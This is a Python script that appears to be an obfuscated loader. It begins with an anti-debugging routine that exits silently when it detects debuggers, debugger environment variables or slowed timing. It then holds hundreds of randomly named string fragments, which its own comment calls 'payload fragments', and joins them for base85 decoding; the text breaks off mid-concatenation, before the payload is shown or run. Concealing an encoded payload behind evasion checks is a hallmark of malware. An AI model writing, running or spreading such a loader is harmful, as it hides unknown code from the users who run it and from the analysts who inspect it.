#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cmknF4KWO7t3Sq = 'EEPH{9<uhd6y6r1<v-3n5uTky{KU}`4j15*D|qVEO$&'
_cdPRD222zd83w7 = 'qGa+?fUo(_P(ba}S|Wa-lrH?+MmpP=1Ii1EeVE<k+xp'
_cbsmX_DB2VErME = 'U-Mf1pNYCdI<48e{iV+JNtv?)Ak-|k;b`0auwXuB9D-'
_cji0V39v5nJSrE = 'jA<e6PfNdjt)&8T>i1gjw2khx5t5n|_T@=RriEmdZEh'
_c_ssE3dfakYHc6 = '9Q!Egyl}Y<NlKF9?0pTrrbzEkKpkkL!Svm1_K}9<|hr'
_c_HeuSfMvTZxJC = 'u$m64OV&j|IvHn<m?nm!el^ZtZYH<GM(66sa!R{R&M2'
_ckSiZaNLuiVeHm = '#LJ-G0dfTa<KbA~Q6ooV4sD?zP^N`>Yp&xXoLR^U;$5'
_crlO0HyUSWW2bc = 'QnXBKrk|>xY9BPbA+UaE`gN5aPw!zG0?0-5%oV4$2I_'
_cxqrcoUjFZ8CLJ = 's8X?6MX&h7!I}(F|%+)Z7hN%;BjUA3tupoE_J^!?%GL'
_cyuTJmx27dNclR = '(-jFT@v(B<o6K*Ch&tK(^#iN5@<-yDUMZPbP_sfzdGf'
_cwbIrmCSEObI52 = 'H(}%(W2(un=5EL*iu9gq`<awpx)r3VE%m^$4X?+M)wM'
_ch3CoOZUEpptVd = 'c{mqH~hNERiBNFFy3dp0QeV+1Ctg_zwJ{d>hzdqe+Lh'
_clmzTpNEoGr9ei = 'vB3@bq<>-iT`k762j8W3J9=`u{Z{@vJ?pn?CdhQD?+F'
_cdtiFjlC2AFjTU = 'vYHS-ubhg1fH9nWD1w07%(wZ6=2_>UYf`J+$QGMhyqe'
_clvqpEiym0Bqp3 = 'd5zK102C8nzmvbnB>UvQAzl&=d%i9T~JGNc)GjCNSnI'
_cvaKOXlxpXKSRe = 'iZso@Ae}C-qLdx586X)Ac-hHWr?C500tzL#%uN?*2Q$'
_c_5S1P5RHV46Qq = 'R?(cQ3<EywUaMU)MFD}uKvu{8j=-lBFm*iTRwgXgJlo'
_cxdvnzThUaRizx = 'x&0oq2ov(^astx6Wk8~IGnwTSkO+Vt}B{OMa|e(*6gx'
_ce3sA141bPpI30 = '?4-R?`bfzeR1TU662#S|+c#V1Fbq39`@bo&pL~-7()C'
_ceKFzs0JUOUqzk = '^Fzye9m|chfn*OD_=4_gA4N{UTOy6F&4laT&ufRsZ$d'
_chUaGY8BZTx97D = 'vVr0_KZ~1`ck;{ap)L;v4z>`?*WQP6-R0^#L-JeKVTS'
_cpYriy9vfMD5e5 = 'EgeYH_dblad;BPug`YXT~mR^qa^rus=8%37#SDUUmZ>'
_c_qVTVa0YCM5ym = 'aSOv)ocTc>Mw0BX?@Zo#rq9_W?~>|6ki8b-j^W%UPqq'
_cpdtdxt6SeTBvZ = 'Z92cC7Fd<|JAU9%TkXjq^Q9;u=e(n8IapjmsC{~(b`d'
_cm7qbfOgDh_V3q = 'JD~mBh6T&BIa4h3RK*O61ImFw%J*u>Ia_Y5?{aJYY@('
_cdDj6kPgppOodW = 'fh9E3s1}T06sXMgXnpiet=t~_#?!;LAf?<_3E|Y(;Ci'
_cq0xtuH7bYbJ5F = '}3VZ0q5o3Q31qJG+tr3%EF$_@G^=8I{AfO_DuVE1J0V'
_caL3iG_mrGoLQ4 = 'i&M;qI%*}=laid&~BOK`{pcdr|(L~+6Xmy=}JShK-rU'
_cxVjklg6mMlBT6 = 'KI39IYom7|livHwfo6CXiU0#G10rk8w#UG`~?=yk`tw'
_cuIDzRCslwvTuA = 'V>|`-?UR7a&Q^Jb|@0bQ2o5D?P=WG30j?llU5s;y{b9'
_czDM1UphVwShaY = 'dUq-Bpkq3gxmk;OHy12(6n*aZ4CtA`^qK}((%oMY=Ja'
_chmp2ebSduShoJ = 'X~k|#m8>|3`$jhO<m7-_H1S)Ybwad%a%&`RZwd)%A$2'
_caJtK76qZSPZlq = 'e)w1p&0#7N!7y?SFTU(*O)Y9K~Y!1i8~>^pUTzTK~MO'
_csfS0IOUeoSxYk = 'qSwgal05fR;aRm9+T@>^<XDDlfXOyTiZ<a^BV8iT%iz'
_caMHTNPGfbA1GH = '|g>%=`v^LCA$HFWL(HC>6yDrbShI%Wl_c3o*GRyiD1P'
_cfuGvSeCqrh7iQ = 'yMSa9lXVd$Ghem7*~WaRN@DOV-A5~+3pNXIqkNr63I!'
_cjsb7r9YMMKeXt = 'pPbj0r!qE)=4h<YYgqDO%DcS5QrEWr*esh5!Ttk8QD='
_cbbCXHXGQz38v_ = 'LB-UhejMafETXMG>X^(C1O`dCL*u-eCH`lHIQ}qfS+y'
_cuXbmd51WpTrKs = 'xP#d6oJ*c&CU8C6I#UYhm$lc<=3Kx)}we1-zS=U$wv('
_cfWeuZejjhwaRn = 'Yy+dSl{Uh_^G9y!#{oXtjkq7cRj+Iof7Q=mW}5KSyAb'
_cjLxtMVZVUejxX = '9edjWYI_z-vGi220~_ndJdmvA-u}Q6BmOJ<b?ux*vyh'
_csGb8gPKZcNtNU = '}Ncg%F2UqWE45G4F}{}NPwRd-%W!v~MKt1qX)0(KqS)'
_cqna2hZmJPa7ZN = 'Svd+7jHyOwf{#deaRO^3q57A7bAZqd+lG&1AR;B|Lyw'
_chGMwxcoZF5s14 = 'D@}=!s+VKW?M`(L-=tSgMsmK4+s9+U`kg|ZS(c`uuJQ'
_czY8yDnSxe00O3 = 'dSp#U&s&e#DUmmncFIA}^^t(5utOD9b7eLYu}4PwkX;'
_crjvzfXlpQwkyO = '2Dm);_1l>CQ3T4FvR}zCExQo>`0KH!%&TL0?fiI50t&'
_cmrZ5JMhNFzBWD = '#NBdxJj)B~%VK*yh{NSGQ8{D8u6_DHBu@<DcZU3xl*d'
_cb0zhLstzI7qwE = 'Uoz0587SE%J^i@gf;Uu69r>0=s%Bkh)}2{JGXio23+I'
_cg75QkuXVbtggW = 'Mb8gk0If4qCW(V~h5KhZluZ(1EwB`A~@c>R2Q~h&nn{'
_cubo8n3EL9z__w = '4vLD>bEneeanAwqSxs_q#%oWJ@Ax0wFXgSNp%v9c&m<'
_cgp9RZzNAujK1V = 'JNcfC@g?h}2%QF-3&fIHYzKkIP{H)+xMJG0zbX|;5s!'
_cmu8qrs9acztE5 = '+j8zR_J%-Mp1{5|+B1Ja(MyA0R=^$4*{XJmzzBgGeBj'
_cogE0mVFLLBFuE = '@bo5%|9MtOT-4GESpvJRGh%me-$7I^NkZBk)nK==w+$'
_cfoOSbn4pol7nG = '#xBjk}3Bh0KGJ=}G<n0`c{GaB=h5ckXLGOCY2xbs<|D'
_coLX6DBaT4YyNd = '1_%0vR?0BS?}2vy2crJ=HqLz=dXfqX*~5l5qp))MM*y'
_cpGz5jIBLm47kG = 'owv|?!8Sk$=D#rV8x<=4;aM}=^u5bjJhCAR5L>qi*}Z'
_cohYqdsamZ0t9W = 'Dj?altPxKy5`Y*H6)J+|kh`diS)nN4bQ2!v5~v>$W}='
_cazFypVm0OZuaI = 'A$g$y-M3oxqp=qdX^&Kabn5M?L8FvXdcPH-D;FyiEpn'
_ca_Jeu8vIH7UlL = 'c;XAL5nrx1-Q=-nzBwcLfPqL?tjMS3Ivf@POePX*YPI'
_cu5ZubYQth2g8P = 'n62DQ^CKO8$$ZX3VzmJc1fDz7@K-r!|d1bxcy$I6A5C'
_cn0DbhJm_woaji = '0>g7}hqY?WlH{GiyT0Aj<eVYtOXAXBEH|?p3cpe6j||'
_cdvr5FnvSSn4Rq = '9g08Ksyx>*Nhyg_sb3sPEB>>0R!ybWv}BO14M2fNXZJ'
_cgNtKnM7qMxvom = '~vqX%4#F2?Qx(`8rf8P*9&&5#ho(i75sEK3bfT;mLy%'
_ckZqP2e537fJrp = 'fL8-))@MW<hDdBGQy81$J1KcTsx~m7H)~Nt+a=Ey~V8'
_c_gPkP5gUxkOtm = '>k1d0)?Z5y+A<qh<0ItoCE?sS&GfoEwhK_J8U;a6=h}'
_c_pxCXHcqHCCED = 'NI>JbE-WAe!MTI7?2PG9lIQ<$R2j*gu~lW~4={ff<V{'
_cchRtG6j7A1DiK = '4?TP=r=9^Ofh@4RUWa|WB*A+{T@S9yt}UpNS{jB;*hO'
_crMQG99sdpZrKl = 'iM4V&AwCaTheVI=D$b4XFX*Jw+&$c2dxiPQ+ExBLj#}'
_csLxlGc4KheIMO = 'kJBe;70g}g0<=t=mze693%Jg+t{3Lka+KE0iq3?}V_>'
_ctAUQk8OzCpFMk = 'ohHav&KqQQ}|z(bP->{ODPape~rMn1o3zQrabc!P%#}'
_cwRgLrBe2IVBoe = '(@bik)kC;MRHqM|?TK6QJZEFTJv%QGg7WUAjj_KC&xI'
_cwUroOAmmYnW3E = 'df?M81a8=Z?GVpqN*>Kx_Jxv6;)Qk6yQ1?X*%ED_p?6'
_cnmYUap1auS9wo = 'CD%T5c!0YB$)=Btq9!HNEx7azSxp8Wht!ktskLNJ0>{'
_c_KNLWbuwRBNWk = 'R0DHt?qo;o4FXB9e+Yl_~R6VW_QG_FZoP4dQh1we|V-'
_coeqt9RtMXvPCb = '6|{`e|t=4+zd!`p0urKM$s;;ij$YH3nO@qHNMWGM3Wd'
_cda41Ucq10kWgH = '<e!sw*3Y&Ch<Z>e1;Kv&Wvdw4ZM!M)CC(G(Ao+(-fJ;'
_cpnoZ0KUZG_8U5 = '8)=mHvEv?@E$EDfC$6U$tILx)DS`C#{9$v7eDI}|#hU'
_cvGlPr02CWprTz = '87CJi0;O8OKP#zHaGGX3`(N4VcYg&zpWT6cLfCY$dni'
_cnyP75YmK8a7_q = 'cF*tgdT-ATUm8jHvfJu9j+fE>Sb6~r)6~V|OYBgW_ro'
_cfF3XemPQKH75M = 'XBSlWZZkiGd(^xL2%CYS&E+o$cWZX@-8EqiU*+JLU@Y'
_ciwIpWp2y04rFe = 'r}aSSixDhjoYHE15Pjb`3O&@EBNtPgS+PM$a>pZi;5{'
_caImpH3WMHiuIG = 'Lm?`?k>pQv98Qj3BKiasEeMas|=u@iOxcT<MsiriESY'
_clcnId38fGPH_y = ';|L?`fIVOCPczQ*bQ#Ax%JDDcv4nZ)9Fi{n0~j(+8R='
_ca7QyG0qzCrwM0 = 'qh5b1yim7z9TM5@pG~`$kIan){dPvW#0jP>cvcM=djo'
_csEEp5B9oTBj9f = 'RQ)vpF&rIQE-X5GLW>ERVG7?}JZweJmXtweN3d$&`qR'
_cuphYgCS_rdzHd = '^|ZBYnj@ek9^1`iIy>EIL#p~{I^V?22a<eLLMT#>uB~'
_cdeyHPtSNDs3h3 = 'JZ`waPhXLL36+~hh38M&%@Sp~!!Zx}k$H{kyTpIzLby'
_cgrVuvX7FJA2zV = '7dgZbfS}%>cxv(e^OC2duT%Fnd&-$=2A>87Pd-?QUX('
_ctinPzanBgBvaP = '3b*~y4Ut$s^VOO`2O@MZZH7VmZQB<+@`11EIK7F0ac7'
_cj5rkQNGEsRglc = 'WDlXfFPa5Y~>+M)X&EMzn9BTEg;hiYhpZzO^#Pa1@E#'
_cbV__yE037fNcr = 'Kcbp|ESLrUMQ;doL1u-Li(pM8I_;F!jl0HETqtm&^H='
_c_iMZYDago4LE6 = 'vxi9B@tR72jFZ^YlF>NM4_WzMX)z2G!l&ff$@WM)R=3'
_cxvQEAQKoy2xXt = 'zC^Y-3KJsB2@TNoNE}B{qw`c^Nq~P>KfVNc)o$;Oi}R'
_cbdRHNg3oIVVuF = 'm_+!)<VZ-bcqF-{5(Wn2&aYnI~NA>0(1osg?s}5pV*2'
_cz9gwsbO2_XlX_ = 'G^63kz42Z~+`k@UQ8fx$4513fTV98gaDE=>A2Y2Vi!A'
_clF86TROYiIyj8 = '4>CrmcPESBm}V}38r0d#v{BB&pKXasUK92Gf=2U19vI'
_coqeaRXPpxgsAa = 's*WiyL}mOp91BFIY@|3Y<*2u!r;##<6UKa+Kw7~O+I)'
_ciOoVGtNGPAzL7 = '<|dNJm4x^sovWsSzR5-EIa-d*kIPGHw5aBoF$4ChDb}'
_cz3gnHm1ORQRl9 = '-cCs7T57{D=Q!WsoIejZ+_xEzz<GS_Thu`H9vtQ7Gl`'
_cduJWmMLZ5vQQ_ = '@S!Spd@25@5kQ@%5(J#UVaJwZUDnR!~73by8F(Y^0@+'
_cnCqa38_BW4OYp = '^Cd`1QMFKejg=WQWfmConZQUCl5S}$vqRK~=CJc(`+s'
_cweh5srKQOSODp = '96(A_g9eY+l#4NLS~jGH_9H@Jcw{3=%RePg%|Pft=gz'
_cpoPdQ1bfedJNU = '_IOB>M&~(v5KmI#)weUA}xClMJD;9h_8*~OXZIu&(`a'
_cxjfUg2edTODcC = 'm-{nOPnhW*|4yO_YXv9}|l~Jwf6YZhn-9lLvLJEO}{B'
_cmy5yP7a7xvvzY = 'V{j53Pr)tZDVfwktwi%rp3EdmpN!;eHOqd0jw~1g<b;'
_cwla2EtCDYmj4H = '?24bh4?PrB2hd2DV4Gc&CdVt=V$Q3K^Cb2}nDPL5Ady'
_cjURJiWoD0E05k = '6z>T;sgbTSl;)OAWmCJOc<-SZ^TK05c|>+EWJWd*I_-'
_ceznDWBV42SR5D = 'qU-#)o|8iGQ1Z>V|Vnooe~T(6%EM^XZmRdFtSiDztLE'
_capp0Q5k60TCR7 = 'MJ~~vd;i}1wYLVZ~QxfOmOm=1QO$&VVbU{IyZ!FaQcx'
_crCP1qTPfMkqTj = 'Q!uKI|j9Z{bg|-iMNfQ&VjYf;P7Ci@&$JXW6k7xY6AX'
_cknJUqZ3z_iric = 'P*M89pATJ7S6o-$L9<~$+84L3A067yla@kv{v0e-n<i'
_cykaghX153OPHX = 'Ky#V`I2?^(-l-VszGA9|DaZATrXBwn9o0V2;|M4(7a{'
_cehwVp0EN11PTw = '6$LD#qZg~Z5~p-U9;X(c3Ka#(>31`Ygvh(Kse=L^df~'
_caiCxUL0mdIkzK = '!vqM>FeAKcwOs<8HwZ7ZYKf$0Y1Ioe<|MRnUYBTN(!9'
_cnLBahxZK34UmC = 'BG^L$>S{6HNM_UAPWe>^k6a;E8h~uqhZ}DTa@oltr71'
_cfnW1SYiBFcCqq = 'xOs@LmdR(jtbT0x`5J2ikTIPq78fQLoRxpurY?_T-=V'
_ciCW0YIzpI8le7 = 'HL03*E^f8cd?p9fQ!9R8<;F)(jQ{6TpqS#v!pmwl&w('
_crAX5aFGX2b0Ib = 'c?fRu3|g&ae}zvQO?5|BDEBx@5FR>(Q^yQ&pfw{j_b<'
_ctpG6WWEic37LM = 'c{9gMQM=n?(2=?9x8HKlPTiJ><?M_E8fbXZjkuMo7S#'
_cga4yAhAxq1Ek3 = '~JXVIiDTXqMQD^U2eL1-aMwOWNncUh0Nyj9O7XI7-nx'
_cfY9h7VU0pEtTm = 'llsilZ#$7dCDeIu7o^`_t&d8og}MNYF7^oXl$^>(&{y'
_cgX20HtNUTk0_S = 'h$-m|hCO}tTvp0kfbb2mc**7YLdKVJwj1Zq(GuH+ctA'
_cd5MZYuhleFKFb = '^3*UXPxsUJy#R8P`wCzZnH=EHEqhyfw_L`O6)<P#<oz'
_chKDZfN5FptqoZ = ';Jb!5D+nj*O{8M?IaoAPrWmK1IeT6s5b}-MWem<ahcq'
_csklWSCG6vEiYd = '(1qoGegQ!X{XJ7E6nHdW6a;4_o!vaI;-?qn$jDVh%iE'
_cxnh_57MVwkaXq = 's+ZtS$$uggA?v{XZTs@GijEAiuR!mDSnlm%0O7LUPGx'
_cnYlrjKZL6x3gY = '2*@OY+Pt&fQyzdc&z5=<!%@dI8Sx;59khS-aP`ysyEz'
_c_RP6qPaxhT1Bd = 'V$rppa_j+!L^l6r1M3*v-k{)k!KbDz#|gO80$(C718!'
_cgEPy98HVMLa1t = 'p*}6>d$d^p#hhf@S$)IInuZtHm`lh;x^NR+{`qt5Z;1'
_cfT9lJDvVu_3u6 = 'zt0f`dE#=l~00bKAG9ww8^8+u3vrPQ`ES?jxc^&&b1Y'
_cebpzLAEyRI5Es = 'FJY;m1ut$AktnCCZ{rmTOmD#;ytOGh9w~pT&1qU=d-F'
_cr5Dk7ndJ77nyI = 'cE9*mmVX7P-_`l9OR#xEvlM7O{pdyDB>Hkl-rony6ae'
_cwYdmWPfYeuiv6 = '$f3dtim60l07G(zeh*8S2sfL;IwV96QNT~RzPKLvWQe'
_coNKviyG0khTGc = ';|6oMwu`=o07!=UIVc@h`ri{`hPgRH^F*s+X_yCEJ`l'
_cfoyqg2oSw58kZ = 'pZ0s|I7n?}<wMx>P0Zra<!iQ~?yY_c5sXIF{>hsa~+L'
_cwSPev0iOXuTms = 'H93cjW2`~Hfc7}1GAsl>ARL>Ub0}ADre}&#9;Qa%xiq'
_cgtcLlNjJ1lkl5 = '6siab8gG(+%-7yOOIhfyGz)XpklHNHUIVl5sg`|VmZ$'
_caOUe_wl2N0TxA = 'vJwGy`0)US5hUaTeAz;B6$p1#bCgN^xS%w<j!9qJknz'
_cqd_8mmVTaDZ7w = 'NpoJy*#KEXA<1syQiw$Pj5GXlD49nA|(s@E5-<86s);'
_ceMpU1gIdXG3KO = 'D}x=+r#RpWs<&D?{gI(b|@h_<lvN>vD^Z5U83kpYMKe'
_cxj5HmCMw10pt8 = 'm1bD%fzy!WI7?JS&D7{9%oX!EJJJV?YAVyP%hyhByAG'
_ctCvL5o1XrIXdH = '0t7BQK27EK{i=(eiG7fQ%K*Axo6bChxk1V|Nf`jeN#0'
_cdqDhjO5zWftX1 = '4sC{RN&`IXSfVSq_z4&G<IuYVtH!|jyx!2k-96W(=`M'
_ceCGu7UHm7d3eI = 'pbe7rFt%QL+s&>1d!No-1Onf6zPWhZAf;lT02+u@(EE'
_ciTS6iewDcIqA9 = 'cH^f!PJIi5Pi)!##hX*5@)w62nSsbAXkL5I3jurB3qv'
_cg_I4se03qs6XL = 'YI=9c_sCVl;(7Ku<?-avpq#C~dG4JL<(0wuHI$AD4O+'
_cv6UWQ_TduY7R_ = 'fhCpp6Yfe=f|S4XmBtHK@qMVBsjbJ*YEG7P1tnX}pj2'
_chMXjSDuKD3YxX = 'S>w_6+XkltR%%sq^f&t2#?DQuzxZZCwLiIQfE8sACN$'
_ctIzBKKVC3VbvY = 'B^*!LdUUCzsKxxStLWQBgOC*YXw5t&&gVxi0MMj(w)C'
_c_oY5REaY66YLw = 'Jl{nf;D?*8U$pk~@KVQj1}rl<A7VWQy;9`UMfvgGj-7'
_cxRvZctPUNSgIB = '&M3-#myv;TA!TwWw4$cZraeTaWJ>F%O^tpdsz?p;Lm7'
_czUcRnubn7qOHW = '$k`<=3eI*hJJB}uYR`*{L8W3PaOjHF|dnk_!vK>J}M#'
_cbqtxbHirqSHlq = 'rvDD#`9Vi)9MsXQDXNRqw<P&fQX{~IEz3dWPQuZz?-H'
_c_R2V_z4c3_WWE = '~-uOAZGn7YAe!975I22_{9`3zW1(JTeuc)}iq@!WU*q'
_cjNY_cbqGkI8yS = 'Qbw(-l38X-c_BxZY~8M8*38OwT==U!tx4==0bMeMlVV'
_ciivcpoLzRJILG = 'RBgrtThi$z&(bco)|Fu8X)kigzpqBzFOP<_EE8xJoYQ'
_cwr3NpNP4ifTGY = 'irCTB5#qCS9<{vu}8{UR><w1B5pv7qCPwlN#>nBFIay'
_cxnaePpxSsTcqz = 'o0mc603xLN=9dpc99CZ!S#vhnPQ`mQz5D+Sa56eRb??'
_cb25ExOv_JrYuZ = 'j);za5KC-2qBvU3jB7%MeBUEn37^s5Ys%})HqXs=|xT'
_cxsu8cp3DZc9Ip = 'uQQ?~CKzY_AF*^U2?7+NyNd3_PSlNqF>5K+hdnvCz;P'
_ccSo9e9uw_bkCH = 'VrS(q@4e<wDpV4tf+OuF)Qn!iOIgZBt12C_ilrUDTMY'
_cvjFncZAVIbhQR = 'uXlXqLeQzkoAym&-*XDZm@K~eR5O~TvBFN+Df&9->9v'
_cz5PlzSwL88tum = 'v9sMsk{g66;IjrgJT<`1c6tnW-RCOM!Fi6EwzYtv{=N'
_crIRAcBNTzXr1Q = 'R-LKG^-r*QL=|{E}buF|y7i-ng4z<U56wQO@?VZn*TA'
_cu6sImaM3jemdw = 'MjdJG3y(KGSt@l!5`gRCfCPp7XBVe!IaiI7<_KKBEsy'
_cxv_Quei6T9_kt = 'Xyh?xgR2ii%L3_{QKpwRAUNa})X(imMQ(ok;Ji6kUI6'
_cspbDlThD4TTKS = 'TL)A70^EvR78f8vPB!s|~{b;&ArKT)kZsF8>5&nXlHY'
_c_xshaWrqBEeJW = '@ctfu`w_>);dWz`XkT}pU1xLvZ-R}u<9+<iIC>BiD3+'
_cjUV5g3TXe2ttK = '<YXdQ&3`-GLX7{c#w^7wd&QO4v!Q>u!p^elEsfn9tRe'
_caYCmrFjZnQDjD = 'EPK%FR=K`jwU`Yb@kX%YNqf9Y~l4unbCZ21{o0&t+fr'
_crSwH7VICAdu_q = 'i}71HnAVr9kuPbKC5tocn0jIk0Bqr5{{eHpQdRN3XLA'
_cm8fw7rq0liEL2 = 'xpVUAwbckkk_0VYdH9B;x?SGz#Sr0kF&xbmXf$wnWAr'
_ctTXn1ZLhOeX9g = 'Iat2?sg`109~3e!@;g{&7TY!sNOJWjxm!G@4W&8>%11'
_cohoYr1_wPhOLz = '|GmCr)r)8Aaz^*FQtlDo?j#8>oOGo&xb9U<#r6!S$cn'
_ccKSR1i1rFy_kb = 'kxkoVN2g&Bg1%(-;lfoq>I{T&vnDX1vB6TkL7M^GBqw'
_cvsN0J_BIlqUok = 'q-?Ik2NOC({hI40X3hB(he>?7n2<ULn>bc7PBAgZ!Jo'
_caJgAUzfv2HcEX = '$T{-7dbW}Tk6GF((*){Snf<+1&bLG&LcEDtJ6&B-^eQ'
_ci_bmVKYv_5yei = 'gTZUg#pa^RY7c??!i%(#*5&`fHN7d|D>vY(f`>7sUlS'
_cuhfEc6WimNJxa = '8;eL9a;MI_fV4$`$9xFeL(zCA`WOaM=-6FTjocdcmow'
_cbYlS1U6CYAY30 = '#6ZKj~YQRu))Pw9U$=r1R!x4C@TV-CUJD0@a%XP*jRO'
_cxzdaoV0Fs_3b2 = 'EM`4u{N(iPVjB9MjzolJ8YhC(SQ`mxJrY(>n%eL^qUl'
_cnX3uodD97R8wX = 'ed4^@5IZbS3sN#Ks<rXw9<*F<N{ZY17U$|)6a4a(Dz<'
_clX3HC9XusxNMj = '>Qv&_@{BX$8DU$Xeq_S;o}|hpib-@eJTg~hL}j4pt`C'
_cwtWFhCiL972hG = 'FypCt(rrbL22R7v_qTAtHwBflB#Io9Xbpt6}F9Jy>xE'
_cgwE6xjAbKtklX = 'sCpJyCS%Nk0v!9Q)Z|^78ZCh>8<MW~P^&*1QG46m^`q'
_caHhre9PRuxaOZ = 'IxzabG-oO6U=M9kNZN&_uP+wK;jG82nK$F0Rz#g9H4A'
_cyJ4tCKRG4zpwd = '<{Vq21a%^D@m-_^lMd!l0r2Cv&2ll%8AlWqV&SJG+mo'
_cb897dwHSzB6IS = '<<Q(3xkcnDA$>zrNPytI4fvcHiV`C*(bRMK-u~vOyB4'
_ck0ntiK9zfBtJu = 'xrLYU*Anld_7b~Cs=O67T=+NpByKz_@e3$%r!N#l2Um'
_cj8VgLg6i2jazf = '1oiJSMYhM{)!a)UWp8={mV!H}eGp9aFa~(%T87#3OTi'
_czbfPMYwtYSrwQ = '*zc;D;g?om+d!pQq0F7=JyJH}zG)dLXF0Mr@#5)B0S='
_csv7aKb3iSiUsl = 'tJp0yqYD6S-bLydvXzuc3u7JP3kjxNxK9j0NuNIq-vK'
_cvU0fakWLx1RKt = 'IzW>EW4XBAOdw26CyV3gOc(ZRI12S@w#UAUCqn<NC8l'
_cgwAkYCzWmOcfU = '5-3Xr6#P{K+0(fyWB$04D1Cv7#B6_JS7F8;ORQ%P8Oa'
_cmyHQRHaa0BnQl = 'P!pZ|fz51)43nOD`h2;eY44`w6_0LQ^;mOTmVpC`;m{'
_cf7F5t5E64XFke = 'EPE!*V&a0i-o%$qXLEsv)0MhH6+;SR5xTSykO8aGJwM'
_cfdLXwIkl620Wa = ')7NNyxje_37tBfWslPkg>IQmy(dySc-ND{nk6B>C92;'
_ciDP68PCJBM8oN = 'f~$W31?V=j^QX8nVV6DtkUe=hi|oGbjm0yFhG+guF5a'
_cuEZFEj9uuqCfp = '}9D~KIFa=9Vd(yg^xuJKj2J+9?=ej4Im++Azc*li_`I'
_creFPQ7fUgDEux = '3f2@3I36-?3qHv{rhr47oVZqoBm1IhB3^jQ8z`9$`@u'
_ct8xl8WBbpH2mq = 'CV}THTeh-X%A1K01&Z#_r*<5NHsIQ%S^l6o?`^ho1z('
_cl5GJY5YhKB4tT = 'v}j`vikWT$$8DDHf9`WNtLZeI7e=*ZRSMQKB#sxbY4h'
_cpm88Q2YhaGoUb = '+2GlLUP&4CIu%FR+5iy6!d7R_<fz<l_Jz3V3*&1Dq-j'
_ci4yfrrlI5RsyO = 'APpg?^-Cx2@U9rX^9*f|plHTCy!IBl9UsmxPSWu$B>('
_coFGtzUzh5m4pe = 'nQu|Gpo+K)+9Tf16sFdjEyrW_vo!+b%cK=)tSrZCq>D'
_cbCj3B4NoAKiNy = '8R!u_%5x)|gq5WV8uttzJ1&k?EH&Yg?aB;AkTGg1y0v'
_colpvY9AAp_R6c = '}-tx+eMWAuK9;2AqA(ybWt84cI@ffp-M=Ms}!?M*Q~B'
_cuK3Kno69o7Hvg = 'q%ZA_CCYsRM5P%MpB=P#GHWjF<y{@)!1O^N>Ucg7!dH'
_chZeoDdtS64F2k = '>!#m}Jjx%vR?nnW1$jqo~y%O|_%Au><2a{5RdQ^jy%}'
_c_tJPnlSOBkkjY = '`~6@ke_YXh}TinT7i-+nC4rQ!U|Dy?K3GX4wbHzd3iT'
_coEmNIX6DOtqRq = '=}BZob8x#b1OlTx6$ry+%v&jvo5}9`u?8d~>)m5&R+|'
_czjqXbsdLd3m0V = 'exJ#%V1&`fO%XECD74k@5Yd2(g=+6VXDhHq#s|FSY``'
_cjnbtYwahTqU2w = 'e(p%n_;(e#Vb#CVg1EuyLDYDz+Vpy#aR*PbsZXJ{CUl'
_clireSBw7Io1DS = 'fWLi%5L*ErV!|}0XAblM0o(v=`Py+4=Fj4ch5_Kv#oo'
_clXcl6PSoEV1Q6 = 'NP89wtedLC+Oka-O%{l-w!67;iP|fbnSuS6leKz2-!n'
_caNYJ4wN5qkkCp = 'k828RMDMyn)P-$ThI6=;dh*@AF*~OgCXYbUEz3@ZN$w'
_c_9U4kDHDp0NKZ = 'TEeBM#J^KQuNQU1fJ3m=z`wAWHz5Ht{VlIjkmg-CX~_'
_ccnStgaWRJBC0c = 'I}<w`~jQWO<;%odEW{Mj^jii*Rn`=%Q0XxONBo-#}P9'
_cidyPfvZ54bPZr = 'An(0tgEk)M$eM0fa%>I*)09=d-;v%_13Fab!w+Q<!vF'
_csKqTcimWG1u5h = '1&<(-pg<J-yC#oHyzNm6(#ib7b3yoA>z2An9`_dnXY>'
_ctRDZ0YqKDwUCK = 'iSCDuGh9yA5Yfq_b~_4Iv02s^fZk-N>1v%yJIIP?>jc'
_cklVWwKOu3iTMW = '4Cj^1VyzgAuV-KT{j^<2ny|BNu}J&>z@uG65~DU&gO@'
_chz3j0jaz0mJgh = '8=%DRxL<9Z~D`&'

_pmDwi_LZQRNLZF = __import__('base64').b85decode(_cmknF4KWO7t3Sq + _cdPRD222zd83w7 + _cbsmX_DB2VErME + _cji0V39v5nJSrE + _c_ssE3dfakYHc6 + _c_HeuSfMvTZxJC + _ckSiZaNLuiVeHm + _crlO0HyUSWW2bc + _cxqrcoUjFZ8CLJ + _cyuTJmx27dNclR + _cwbIrmCSEObI52 + _ch3CoOZUEpptVd + _clmzTpNEoGr9ei + _cdtiFjlC2AFjTU + _clvqpEiym0Bqp3 + _cvaKOXlxpXKSRe + _c_5S1P5RHV46Qq + _cxdvnzThUaRizx + _ce3sA141bPpI30 + _ceKFzs0JUOUqzk + _chUaGY8BZTx97D + _cpYriy9vfMD5e5 + _c_qVTVa0YCM5ym + _cpdtdxt6SeTBvZ + _cm7qbfOgDh_V3q + _cdDj6kPgppOodW + _cq0xtuH7bYbJ5F + _caL3iG_mrGoLQ4 + _cxVjklg6mMlBT6 + _cuIDzRCslwvTuA + _czDM1UphVwShaY + _chmp2ebSduShoJ + _caJtK76qZSPZlq + _csfS0IOUeoSxYk + _caMHTNPGfbA1GH + _cfuGvSeCqrh7iQ + _cjsb7r9YMMKeXt + _cbbCXHXGQz38v_ + _cuXbmd51WpTrKs + _cfWeuZejjhwaRn + _cjLxtMVZVUejxX + 